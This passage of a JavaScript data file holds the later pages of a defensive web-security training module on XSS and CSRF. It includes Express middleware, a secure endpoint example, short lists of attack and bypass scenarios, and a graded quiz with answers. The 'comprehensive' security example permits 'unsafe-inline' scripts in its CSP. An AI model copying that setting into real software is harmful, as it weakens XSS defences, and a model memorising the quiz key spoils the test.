- **CSRF libraries**: csurf middleware for token validation
- **Input validation**: express-validator library

## Security Testing

### XSS Testing
1. **Manual testing**: Try various payloads in inputs
2. **Automated scanners**: OWASP ZAP, Burp Suite
3. **Code review**: Look for unsanitized output
4. **Content Security Policy**: Monitor CSP violations

### CSRF Testing
1. **Token validation**: Test with missing/invalid tokens
2. **Cross-origin requests**: Test from different domains
3. **HTTP method testing**: Test all state-changing operations
4. **SameSite validation**: Test cookie behavior

## Security Headers Configuration

### Comprehensive Security Headers
Implementing a complete set of security headers for defense in depth.`,
        pageNumber: 8,
        type: "hands-on",
        codeExamples: [
          {
            language: "javascript",
            code: `// Complete security middleware setup (Express.js)
const helmet = require('helmet');
const csrf = require('csurf');
const rateLimit = require('express-rate-limit');

// Security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

// CSRF protection
const csrfProtection = csrf({ cookie: true });
app.use(csrfProtection);

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use(limiter);`,
            description: "Comprehensive security middleware setup"
          }
        ],
        keyPoints: [
          "Use framework-specific security features",
          "Implement comprehensive testing strategies",
          "Configure appropriate security headers",
          "Regular security assessments are essential"
        ]
      },
      {
        title: "Advanced XSS and CSRF Scenarios",
        content: `# Advanced Attack Scenarios and Edge Cases

Understanding complex scenarios helps build more robust defenses.

## Advanced XSS Scenarios

### Mutation XSS (mXSS)
- Occurs during HTML parsing and DOM manipulation
- Browser inconsistencies in parsing
- Server-side filters may not catch client-side mutations

### Template Injection
- Server-side template engines with user input
- Can lead to server-side code execution
- Common in frameworks using template languages

### JavaScript Framework Vulnerabilities
- Angular template injection
- React dangerouslySetInnerHTML misuse
- Vue.js v-html directive vulnerabilities

### File Upload XSS
- Malicious files with embedded scripts
- SVG files with JavaScript
- HTML files served with incorrect content-type

## Advanced CSRF Scenarios

### JSON-Based CSRF
- REST APIs accepting JSON payloads
- Content-Type manipulation to bypass CORS
- Flash-based attacks (less common now)

### Login CSRF
- Forcing user to login with attacker's credentials
- Can lead to data leakage or session fixation
- Often overlooked in security assessments

### CSRF in WebSockets
- WebSocket connections don't follow same-origin policy
- No built-in CSRF protection
- Requires custom authentication mechanisms

## Defense Bypasses

### CSP Bypasses
- JSONP endpoints allowing callback manipulation
- Whitelisted domains hosting user content
- Browser extension interactions

### CSRF Token Bypasses
- Reflected XSS to extract tokens
- Subdomain takeover scenarios
- Predictable token generation`,
        pageNumber: 9,
        type: "example",
        codeExamples: [
          {
            language: "javascript",
            code: `// Example of secure API endpoint implementation
app.post('/api/transfer', [
  // Rate limiting
  rateLimit({ windowMs: 60000, max: 5 }),
  
  // Authentication
  requireAuth,
  
  // CSRF protection
  validateCSRF,
  
  // Input validation
  body('amount').isNumeric().custom(value => {
    if (value <= 0 || value > 10000) {
      throw new Error('Invalid amount');
    }
    return true;
  }),
  
  // Sanitize input
  sanitize('recipient').escape(),
  
], async (req, res) => {
  try {
    // Additional authorization check
    if (!await canUserTransfer(req.user.id, req.body.amount)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    
    // Process transfer with additional logging
    await processTransfer({
      from: req.user.id,
      to: req.body.recipient,
      amount: req.body.amount,
      ip: req.ip,
      userAgent: req.get('User-Agent')
    });
    
    res.json({ success: true });
  } catch (error) {
    logger.error('Transfer failed', error);
    res.status(500).json({ error: 'Transfer failed' });
  }
});`,
            description: "Comprehensive secure endpoint implementation"
          }
        ],
        keyPoints: [
          "Advanced attacks exploit complex scenarios",
          "Defense bypasses are possible with incomplete protection",
          "Comprehensive security requires multiple layers",
          "Regular security updates and testing are crucial"
        ]
      },
      {
        title: "Summary and Best Practices",
        content: `# XSS and CSRF Protection Summary

## Key Concepts Learned

### Cross-Site Scripting (XSS)
- **Three types**: Reflected, Stored, DOM-based
- **Attack vectors**: Forms, URLs, headers, cookies
- **Prevention**: Input validation, output encoding, CSP
- **Impact**: Session hijacking, data theft, malware

### Cross-Site Request Forgery (CSRF)
- **Attack mechanism**: Exploits browser trust
- **Requirements**: User authentication, predictable requests
- **Prevention**: CSRF tokens, SameSite cookies, custom headers
- **Impact**: Unauthorized actions, financial fraud

## Best Practices Checklist

### XSS Prevention
- ✅ Validate all input on server-side
- ✅ Use context-aware output encoding
- ✅ Implement Content Security Policy
- ✅ Use HTTPOnly cookies for sessions
- ✅ Regular security testing and code review

### CSRF Prevention
- ✅ Implement CSRF tokens for all state-changing operations
- ✅ Use SameSite cookie attribute
- ✅ Validate Origin/Referer headers
- ✅ Use custom headers for AJAX requests
- ✅ Never use GET for state-changing operations

### General Security Practices
- ✅ Apply defense in depth
- ✅ Keep frameworks and libraries updated
- ✅ Implement proper error handling
- ✅ Use security headers consistently
- ✅ Monitor and log security events

## Common Mistakes to Avoid

1. **Relying only on client-side validation**
2. **Using blacklist-based input filtering**
3. **Insufficient output encoding for different contexts**
4. **Missing CSRF protection on admin functions**
5. **Ignoring DOM-based XSS vulnerabilities**
6. **Not testing security controls regularly**

## Next Steps

After completing this module, you should be able to:
- Identify XSS and CSRF vulnerabilities in code
- Implement appropriate protection mechanisms
- Test applications for these vulnerabilities
- Understand the impact and business risk

Consider advancing to intermediate-level modules covering:
- SQL Injection attacks and prevention
- Authentication bypass techniques
- Session management vulnerabilities
- Advanced web application security testing`,
        pageNumber: 10,
        type: "summary",
        keyPoints: [
          "XSS and CSRF are common but preventable vulnerabilities",
          "Multiple protection layers provide better security",
          "Regular testing and updates are essential",
          "Framework-specific protections should be leveraged"
        ],
        additionalResources: [
          {
            title: "OWASP Testing Guide - XSS",
            url: "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting",
            type: "documentation"
          },
          {
            title: "OWASP CSRF Prevention Cheat Sheet",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
            type: "documentation"
          }
        ]
      }
    ],
    quiz: {
      questions: [
        {
          question: "Which type of XSS attack is stored permanently on the server?",
          type: "multiple-choice",
          options: ["Reflected XSS", "Stored XSS", "DOM-based XSS", "Blind XSS"],
          correctAnswer: 1,
          explanation: "Stored XSS (also called Persistent XSS) is permanently stored on the server and affects all users who view the content.",
          difficulty: "easy",
          points: 1
        },
        {
          question: "What is the primary defense mechanism against CSRF attacks?",
          type: "multiple-choice",
          options: ["Input validation", "CSRF tokens", "Output encoding", "Rate limiting"],
          correctAnswer: 1,
          explanation: "CSRF tokens are the primary defense mechanism, providing unpredictable values that attackers cannot forge.",
          difficulty: "medium",
          points: 2
        },
        {
          question: "Which of the following can help prevent XSS attacks? (Select all that apply)",
          type: "multiple-select",
          options: ["Output encoding", "Content Security Policy", "Input validation", "HTTPS"],
          correctAnswers: [0, 1, 2],
          explanation: "Output encoding, CSP, and input validation all help prevent XSS. HTTPS doesn't directly prevent XSS attacks.",
          difficulty: "medium",
          points: 2
        },
        {
          question: "DOM-based XSS occurs entirely on the client-side without involving the server.",
          type: "true-false",
          options: ["True", "False"],
          correctAnswer: 0,
          explanation: "DOM-based XSS occurs when client-side JavaScript unsafely processes user input, without the payload ever reaching the server.",
          difficulty: "medium",
          points: 2
        },
        {
          question: "Which SameSite cookie value provides the strongest CSRF protection?",
          type: "multiple-choice",
          options: ["None", "Lax", "Strict", "Default"],
          correctAnswer: 2,
          explanation: "SameSite=Strict provides the strongest protection by never sending cookies with cross-site requests.",
          difficulty: "hard",
          points: 3
        }
      ],
      passingScore: 70,
      timeLimit: 20,
      maxAttempts: 3
    },
    tags: ["xss", "csrf", "owasp", "injection", "browser-security"],
    isPublished: true
  }
  // Continue with intermediate and advanced modules...
];

module.exports = webSecurityModules;
